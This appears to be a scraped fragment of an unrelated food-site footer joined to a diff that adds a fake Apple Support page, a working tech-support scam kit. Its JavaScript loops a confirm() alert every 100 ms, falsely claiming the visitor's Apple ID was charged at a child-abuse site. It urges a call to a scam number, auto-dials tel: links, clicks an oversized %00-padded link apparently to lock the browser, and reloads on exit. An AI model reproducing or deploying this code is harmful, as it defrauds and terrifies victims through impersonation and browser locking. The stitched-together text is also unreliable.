class="box-VbhZznPAzrTmhK"><div class="button-SczqSPFyoI"><div class="sm-fjlxXV"><img src="./img/90d1319f57bc2afeccb0b6f5d51841c719a94135.jpg" class="wrapper-comWxx"/></div></div><div class="medium-mmFSEuvS"><div class="headline-LJKHbbAbQ"><a href="themelist5.html" class="picture-KFDhjoNQpO"><span class="grid-NgJbauzZg">Discover more</span></a><a href="index.php" class="col-hSaMXTYudOpW"><span class="section-NPzwoJfCpsJjfwoR">Send out</span></a></div><div class="section-YbliShDihm"><h5 class="sm-flrYUPxN">Exploring the World of Craft Beverages: A Sip into Innovation</h5><div class="wrapper-DtAHEnJs"><span class="col-isdHqHuqBHQTVsLS">This Taste article Recipe Cuisine Desserts examines the rise Dish Non-veg Snacks of craft beverages, exploring their unique Soups Cooking Ingredient Flavor Vegetarian Beverages characteristics, production Seafood Vegan processes, Dining Meal and cultural significance in today's market.</span></div></div><div class="wide-rNGTsNSYqb"><div class="pic-pziOJjrqjDxOuc"><div class="box-tdDLwepuzr"><span class="breadcrumbs-chLvxdOw">Oliver Schmidt</span></div></div><div class="col-fCUYxSnCYzYaTKGl"><div class="subtitle-PJcOlAfmwE"><span class="lg-DTssDFvESFLNyEG">2025-04-21</span></div></div></div></div></div></div></div></main><footer class="big-HFvnCFpIxVxkLogX"><div class="wrapper-cGPfYP"><a href="./privacy_policy.html" class="content-EueTbAmzLzkfSNQu">Privacy Policy</a><a href="./terms_of_use.html" class="wrapper-LkDhxXaax">Terms Of Use</a><a href="./cookie_policy.html" class="title-jrIgeDwug">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="caption-ssmqtytRaRsEwy"/><section class="lg-IPgGaOaKtQIZIN"><div class="lg-uMqSWNaYJiYmRfdf"><span class="avatar-sgBGAKgMlgzQ">Our use of cookies.<br>We use necessary cookies to make our site work. We’d also like to set analytics cookies that help us make improvements by measuring how you use the site. These will be set only if you accept. For more detailed information about the cookies we use, see our Cookies policy.</span></div><div class="text-dytDnsBoKhBFCZN"><div class="all-tMrNjDdPgdMrKZvj"><label for="close" class="row-HVHlss"><span class="xl-RqYFvcfszmA">Policy information</span></label></div><div class="pic-UUVWjkBirhC"><label for="close" class="picture-vDqnjrkJBsi"><span class="caption-jAFwfadqerYwnfkm">Ok</span></label></div><div class="page-nnLbYqEOnOzdiy"><label for="close" class="button-NvxnNkkeTNtEMk"><span class="sidebar-sEnyFXu">Deny</span></label></div></div></section></body></html>
+  gtag('config', 'G-NP1FZ3QXDK');
+</script>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-888-449-8028 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
+                            id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class='as-banner-cont'>
+                        <div class='as-banner-image as-banner-image--top'>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
+                            />
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock" />
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">CHILD PORNOGRAPHY WEBSITE </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="globalnav/apple/us.png" alt="" width="16" height="16" />United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name" />
+                <meta content="+1-888-449-8028
+			 " property="telephone" />
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-888-449-8028');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-449-8028"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at CHILD PORNOGRAPHY WEBSITE for $549.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-888-449-8028 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+</body>
+
+
+</html>
